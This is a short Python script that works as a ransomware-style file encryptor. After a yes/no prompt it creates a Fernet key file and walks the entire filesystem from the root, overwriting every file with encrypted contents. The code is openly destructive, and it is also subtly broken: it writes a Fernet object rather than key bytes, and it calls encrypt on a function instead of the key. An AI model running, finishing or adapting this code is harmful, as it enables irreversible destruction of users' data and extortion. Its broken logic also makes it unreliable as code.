import os, time
from cryptography.fernet import Fernet
from termcolor import colored

# Base settings
keyFile = 'important.key'

# Determine Operation System.
if os.name == 'posix':
    root = "/"
else:
    root = "C:\\"


# Creating a key file and value.
def key():
    key = Fernet.generate_key()
    key = Fernet(key)
    path = os.getcwd()
    with open(keyFile, "wb") as file:
        file.write(key)
        file.close()
    print('Key file was created in ' + path + ' with the name : ' + keyFile + '\nDO NOT LOSE IT !')
    return key


# Encrypting file with created key.
def enc(filename):
    with open(filename, "rb") as file:
        filed = file.read()
    enc_file = key.encrypt(filed)
    with open(filename, "wb") as file:
        filed = file.write(enc_file)
    print('File : ' + colored(filename, 'green') + ' successfully encrypted.')


def get_file():
    for r, d, f in os.walk(root):
        for file in f:
            filePath = os.path.join(r, file)
            enc(filePath)


if __name__ == '__main__':
    Go = input('Hello user, do you want to start encrypting ?\nYes to begin, No to quit')
    if Go.lower() == "yes":
        print(colored('Encrypting started !\n', 'red'))
        key()
        time.sleep(2)
        get_file()
    else:
        print('Yeah you better be careful !')
